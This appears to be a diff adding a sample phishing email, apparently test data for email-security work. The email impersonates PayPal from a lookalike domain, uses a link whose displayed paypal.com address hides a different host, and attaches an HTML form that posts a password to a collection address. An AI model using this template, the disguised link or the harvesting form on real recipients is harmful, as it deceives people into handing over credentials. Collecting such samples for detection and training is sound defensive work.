@@ -1,0 +1,35 @@
+Return-Path: <bounce@mailer.cheap-sender.ru>
+Authentication-Results: mx.example.com;
+ spf=fail (sender IP is not authorized) smtp.mailfrom=paypa1-alerts.xyz;
+ dkim=none;
+ dmarc=fail header.from=paypa1-alerts.xyz
+From: "PayPal Security Team" <security@paypa1-alerts.xyz>
+Reply-To: account-help@secure-helpdesk.top
+To: customer@example.com
+Subject: URGENT: Unusual activity - your account has been suspended
+Date: Mon, 16 Nov 2026 09:12:44 +0000
+Message-ID: <a1b2c3d4@paypa1-alerts.xyz>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY-123"
+
+--BOUNDARY-123
+Content-Type: text/html; charset="utf-8"
+
+<html>
+  <body>
+    <p>Dear Customer,</p>
+    <p>We detected unusual activity on your account. To avoid permanent suspension,
+       you must verify your identity within 24 hours.</p>
+    <p><a href="http://paypa1-secure-login.xyz/verify-account?id=88213">https://www.paypal.com/signin</a></p>
+    <p>Alternatively, open the attached secure form.</p>
+    <p>PayPal Security Team</p>
+  </body>
+</html>
+
+--BOUNDARY-123
+Content-Type: text/html; name="Secure_Verification_Form.html"
+Content-Disposition: attachment; filename="Secure_Verification_Form.html"
+
+<html><body><form action="http://192.168.13.37/collect"><input name="password"></form></body></html>
+
+--BOUNDARY-123--
